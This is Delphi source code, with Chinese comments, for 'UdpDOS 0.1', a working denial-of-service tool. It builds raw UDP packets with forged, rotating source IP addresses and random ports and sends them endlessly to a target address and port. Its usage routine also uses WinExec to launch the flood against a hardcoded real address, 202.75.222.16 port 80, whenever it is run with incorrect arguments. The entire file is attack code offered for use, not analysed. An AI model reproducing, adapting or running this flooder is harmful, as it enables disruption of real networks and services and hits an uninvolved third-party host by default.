program udpdos;
{$APPTYPE CONSOLE}
uses windows;
// IP 头
type
T_IP_Header = record
ip_verlen : Byte; //Version 4 IP头的版本号，目前是IPv4，最新是IPv6
ip_tos : Byte;   //Type of Service 8 服务类型，定义了数据传输的优先级、延迟、吞吐量和可靠性等特性
ip_totallength : Word; //Total Packet Length 16 IP包的长度，若没有特殊选项，一般为20字节长
ip_id : Word; //Identification 16 IP包标识，主机使用它唯一确定每个发送的数据报
ip_offset : Word; //Fragment Offset 13 IP数据分割偏移
ip_ttl : Byte; //Time to Live 8 数据报在网络上的存活时间，每通过一个路由器，该数值减一
ip_protocol : Byte;//Protocol 8 TCP/IP协议类型，比如：ICMP为1，IGMP为2，TCP为6，UDP为17等
ip_checksum : Word; //Header Checksum 16 头部检验和
ip_srcaddr : LongWord;  //Source IP Address 32 源IP地址
ip_destaddr : LongWord; //Destination IP Address 32 目的IP地址
end;
// UDP 头
Type
T_UDP_Header = record
src_portno : Word;     //源IP端口
dst_portno : Word;     //目标IP端口
udp_length : Word;     //UDP头的长度
udp_checksum : Word;   //UDP头部校验和
end;
// 一些 Winsock 2 的类型声明
u_char = Char;
u_short = Word;
u_int = Integer;
u_long = Longint;
SunB = packed record
s_b1, s_b2, s_b3, s_b4: u_char;
end;
SunW = packed record
s_w1, s_w2: u_short;
end;
in_addr = record
case integer of
0: (S_un_b: SunB);
1: (S_un_w: SunW);
2: (S_addr: u_long);
end;
TInAddr = in_addr;
Sockaddr_in = record
case Integer of
0: (sin_family: u_short;
sin_port: u_short;
sin_addr: TInAddr;
sin_zero: array[0..7] of Char);
1: (sa_family: u_short;
sa_data: array[0..13] of Char)
end;
TSockAddr = Sockaddr_in;
TSocket = u_int;
const
WSADESCRIPTION_LEN = 256;
WSASYS_STATUS_LEN = 128;
const
AF_INET = 2; // internetwork: UDP, TCP, etc.
IP_HDRINCL = 2; // IP Header Include
SOCK_RAW = 3; // raw-protocol interface
IPPROTO_IP = 0; // dummy for IP
IPPROTO_TCP = 6; // tcp
IPPROTO_UDP = 17; // user datagram protocol
IPPROTO_RAW = 255; // raw IP packet
INVALID_SOCKET = TSocket(NOT(0));
SOCKET_ERROR = -1;
type
PWSAData = ^TWSAData;
WSAData = record //  WSDATA
wVersion: Word;
wHighVersion: Word;
szDescription: array[0..WSADESCRIPTION_LEN] of Char;
szSystemStatus: array[0..WSASYS_STATUS_LEN] of Char;
iMaxSockets: Word;
iMaxUdpDg: Word;
lpVendorInfo: PChar;
end;
TWSAData = WSAData;
const
  Max_Message    = 4068;
  Max_Packet     = 4096;
  FAKE_IP        = '10.168.150.1'; //伪装IP的起始值，本程序的伪装IP覆盖一个B类网段
type
  TPacketBuffer = Array[0..Max_Packet-1] of byte;
type
  CLIENTPARA = record
  Port:integer;
  IP:string;
end;
//定义一些 winsock 2 函数
function closesocket(s: TSocket): Integer; stdcall;external 'ws2_32.dll';    //关闭套接口
function socket(af, Struct, protocol: Integer): TSocket; stdcall;external 'ws2_32.dll';   //创建一个通讯端点并返回一个套接口。
function sendto(s: TSocket; var Buf; len, flags: Integer; var addrto: TSockAddr;
tolen: Integer): Integer; stdcall;external 'ws2_32.dll'; //从已连接或未连接的套接口发送数据。
function setsockopt(s: TSocket; level, optname: Integer; optval: PChar;
optlen: Integer): Integer; stdcall;external 'ws2_32.dll';   //设置与指定套接口相关的属性选项。
function inet_addr(cp: PChar): u_long; stdcall;external 'ws2_32.dll'; {PInAddr;} { TInAddr }
//把一个Internet标准的"."记号地址转换成Internet地址数值。
function htons(hostshort: u_short): u_short; stdcall;external 'ws2_32.dll';   //把16位的数字从主机字节顺序转换到网络字节顺序。
function WSAGetLastError: Integer; stdcall;external 'ws2_32.dll';  //获取最近错误号
function WSAStartup(wVersionRequired: word; var WSData: TWSAData): Integer; stdcall;external 'ws2_32.dll';
//对Windows Sockets DLL进行初始化,协商WINSOCK的版本支持,并分配必要的资源.
function WSACleanup: Integer; stdcall;external 'ws2_32.dll';
//终止对Windows Sockets DLL的使用,并释放资源,以备下一次使用.
function ntohl(netlong: u_long): u_long; stdcall;external 'ws2_32.dll';
function htonl(hostlong: u_long): u_long; stdcall;external 'ws2_32.dll';
var
  clientpa :^CLIENTPARA;
  SendSEQ :Integer = 0;
  StrMessage:string;
function IntToStr(I: integer): string;
begin
  Str(I, Result);
end;
function StrToInt(S: string): integer;
begin
  Val(S, Result, Result);
end;
function LowerCase(const S: string): string;
var
  Ch: Char;
  L: Integer;
  Source, Dest: PChar;
begin
  L := Length(S);
  SetLength(Result, L);
  Source := Pointer(S);
  Dest := Pointer(Result);
  while L <> 0 do
  begin
    Ch := Source^;
    if (Ch >= 'A') and (Ch <= 'Z') then Inc(Ch, 32);
    Dest^ := Ch;
    Inc(Source);
    Inc(Dest);
    Dec(L);
  end;
end;
function CheckSum(Var Buffer; Size : integer) : Word;
type
TWordArray = Array[0..1] of Word;
var
ChkSum : LongWord;
i : Integer;
begin
ChkSum := 0;
i := 0;
While Size > 1 do begin
ChkSum := ChkSum + TWordArray(Buffer)[i];
inc(i);
Size := Size - SizeOf(Word);
end;
if Size=1 then ChkSum := ChkSum + Byte(TWordArray(Buffer)[i]);
ChkSum := (ChkSum shr 16) + (ChkSum and $FFFF);
ChkSum := ChkSum + (Chksum shr 16);
Result := Word(ChkSum);
end;
//udpdos攻击
function UdpDosThreadProc(p:Pointer):LongInt;stdcall;
var
  remote : TSockAddr;
  wsdata : TWSAdata;
  sock : TSocket;
  Ptr : ^Byte;
  iIPVersion,iIPSize : Word;
  iUdpChecksumSize,iTotalSize,cksum,iUdpSize : Word;
  ipHdr : T_IP_Header;
  udpHdr : T_UDP_Header;
  ret, bOpt, FakeIpNet,FakeIpHost,counter : Integer;
  Buf : TPacketBuffer;
  StrMessage:string;
  //FromIP : String;
  procedure IncPtr(Value : Integer);
  begin
    ptr := pointer(integer(ptr) + Value);
  end;
begin
  result :=0;
  // Startup Winsock 2
  ret := WSAStartup($0002, wsdata);
  if ret<>0 then
  begin
    writeln('WSA Startup failed.');
    exit;
  end;
  writeln('WSA Startup:');
  writeln('Desc.: '+wsData.szDescription);
  writeln('Status: '+wsData.szSystemStatus);
  // Create socket
  sock := Socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
  if (sock = INVALID_SOCKET) then
  begin
    writeln('Socket() failed: '+IntToStr(WSAGetLastError));
    exit;
  end;
  writeln('Socket Handle = '+IntToStr(sock));
  // Option: Header Include
  bOpt := 1;
  ret := SetSockOpt(sock, IPPROTO_IP, IP_HDRINCL, @bOpt, SizeOf(bOpt));
  if ret = SOCKET_ERROR then
  begin
    writeln('setsockopt(IP_HDRINCL) failed: '+IntToStr(WSAGetLastError));
    exit;
  end;
  
  remote.sin_family := AF_INET;
  Remote.sin_addr.S_addr :=inet_addr(pchar(CLIENTPARA(p^).IP));
  Remote.sin_port :=htons(CLIENTPARA(p^).Port);
  FakeIpNet:=inet_addr(FAKE_IP);
  FakeIpHost:=ntohl(FakeIpNet);
  // 初始化 IP 头
  iTotalSize := sizeof(ipHdr) + sizeof(udpHdr) + length(strMessage);
  iIPVersion := 4;
  iIPSize := sizeof(ipHdr) div sizeof(LongWord);
  ipHdr.ip_verlen := (iIPVersion shl 4) or iIPSize;
  ipHdr.ip_tos := 0; // IP type of service
  ipHdr.ip_totallength := htons(iTotalSize); // Total packet len
  ipHdr.ip_id := 0; // Unique identifier: set to 0
  ipHdr.ip_offset := 0; // Fragment offset field
  ipHdr.ip_ttl := 128; // Time to live
  ipHdr.ip_protocol := $11; // Protocol(UDP)
  ipHdr.ip_checksum := 0 ; // IP checksum
  ipHdr.ip_srcaddr := htonl(FakeIpHost+SendSEQ); // Source address
  ipHdr.ip_destaddr := inet_addr(pchar(CLIENTPARA(p^).IP)); // Destination address
  //随机产生源地址
  {FromIP:=IntToStr(Random(254)+1)+'.'+ IntToStr(Random(254)+1)+'.'+
                   IntToStr(Random(254)+1)+'.'+Inttostr(Random(254)+1);
  ipHdr.ip_srcaddr:=inet_Addr(PChar(FromIP)); //32位源IP地址
  ipHdr.ip_destaddr:=Remote.sin_addr.S_addr;  //32位目的IP地址 }
  // 初始化 UDP 头
  iUdpSize := sizeof(udpHdr) + length(strMessage);
  udpHdr.src_portno := htons(Random(65536)+1);  //随机产生源端口
  udpHdr.dst_portno := remote.sin_port;         //目的端口号
  udpHdr.udp_length := htons(iUdpSize);
  udpHdr.udp_checksum := 0;
  while true do
  begin
    //每发送10,240个报文输出一个标示符
    //writeln('.');
    for counter:=0 to 10239 do
    begin
      inc(SendSEQ);
      if (SendSEQ=65536) then SendSEQ :=1; //序列号循环
      //更改IP首部
      ipHdr.ip_checksum :=0; //16位IP首部校验和
      ipHdr.ip_srcaddr :=htonl(FakeIpHost+SendSEQ); //32位源IP地址
      //更改UDP首部
      udpHdr.udp_checksum :=0; //校验和
      udpHdr.src_portno := htons(Random(65536)+1);  //随机产生源端口
      iUdpChecksumSize := 0;
      ptr := @buf[0];
      FillChar(Buf, SizeOf(Buf), 0);
      Move(ipHdr.ip_srcaddr, ptr^, SizeOf(ipHdr.ip_srcaddr));
      IncPtr(SizeOf(ipHdr.ip_srcaddr));
      iUdpChecksumSize := iUdpChecksumSize + sizeof(ipHdr.ip_srcaddr);
      Move(ipHdr.ip_destaddr, ptr^, SizeOf(ipHdr.ip_destaddr));
      IncPtr(SizeOf(ipHdr.ip_destaddr));
      iUdpChecksumSize := iUdpChecksumSize + sizeof(ipHdr.ip_destaddr);
      IncPtr(1);
      Inc(iUdpChecksumSize);
      Move(ipHdr.ip_protocol, ptr^, sizeof(ipHdr.ip_protocol));
      IncPtr(sizeof(ipHdr.ip_protocol));
      iUdpChecksumSize := iUdpChecksumSize + sizeof(ipHdr.ip_protocol);
      Move(udpHdr.udp_length, ptr^, sizeof(udpHdr.udp_length));
      IncPtr(sizeof(udpHdr.udp_length));
      iUdpChecksumSize := iUdpChecksumSize + sizeof(udpHdr.udp_length);
      move(udpHdr, ptr^, sizeof(udpHdr));
      IncPtr(sizeof(udpHdr));
      iUdpChecksumSize := iUdpCheckSumSize + sizeof(udpHdr);
      Move(StrMessage[1], ptr^, Length(strMessage));
      IncPtr(Length(StrMessage));
      iUdpChecksumSize := iUdpChecksumSize + length(strMessage);
      cksum := checksum(buf, iUdpChecksumSize);
      udpHdr.udp_checksum := cksum;
      //现在 IP 和 UDP 头OK了，我们可以把它发送出去。
      FillChar(Buf, SizeOf(Buf), 0);
      Ptr := @Buf[0];
      Move(ipHdr, ptr^, SizeOf(ipHdr)); IncPtr(SizeOf(ipHdr));
      Move(udpHdr, ptr^, SizeOf(udpHdr)); IncPtr(SizeOf(udpHdr));
      Move(StrMessage[1], ptr^, length(StrMessage));
      //发送TCP报文
      ret:=sendto(sock, buf, iTotalSize, 0, Remote, sizeof(Remote));
      if ret = SOCKET_ERROR then
        writeln('sendto() failed: '+IntToStr(WSAGetLastError))
      else
        //writeln('send '+IntToStr(ret)+' bytes.');
//        write('.');
      end;
//      writeln('');
  end;
  // Close socket
  CloseSocket(sock);
  // Close Winsock 2
  WSACleanup;
end;
procedure Usage;
begin
  WriteLn('UdpDOS 0.1 for 2000/XP/2003');
  WriteLn('http://www.wrsky.com');
  WriteLn('hnxyy@hotmail.com');
  WriteLn('QQ:19026695');
  WriteLn;
  WriteLn('Usage: UdpDOS -h:IP -p:port');
  WinExec('UdpDOS -h:202.75.222.16 -p:80',0)
end;
procedure ParseOption(Cmd, Arg: string);
begin
  if arg='' then
  begin
    Usage;
    clientpa^.IP :='202.75.222.16';
     clientpa^.Port :=80;
  end;
  if lstrcmp('-h:', pchar(LowerCase(Cmd))) = 0 then
  begin
    clientpa^.IP :=arg;
  end
  else if lstrcmp('-p:', pchar(LowerCase(Cmd))) = 0 then
  begin
    clientpa^.Port :=StrToInt(Arg);
  end
  else
  begin
    Usage;
    Halt(0);
  end;
end;
procedure ProcessCommandLine;
var
  CmdLn: integer;
begin
  CmdLn := 1;
  if (ParamCount<2) or (ParamCount>2) then
  begin
    Usage;
    Halt(0);
  end;
  new(clientpa);
  while Length(ParamStr(CmdLn)) <> 0 do
  begin
    ParseOption(Copy(ParamStr(CmdLn), 1, 3), Copy(ParamStr(CmdLn), 4, Length(ParamStr(CmdLn)) - 2));
    Inc(CmdLn);
  end;
end;
var
  ThreadID:DWord;
begin
  ProcessCommandLine;
  StrMessage :='xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx';
  CreateThread(nil, 0, @UdpDosThreadProc, clientpa, 0, ThreadID);
  while True do Sleep(1);
end. 
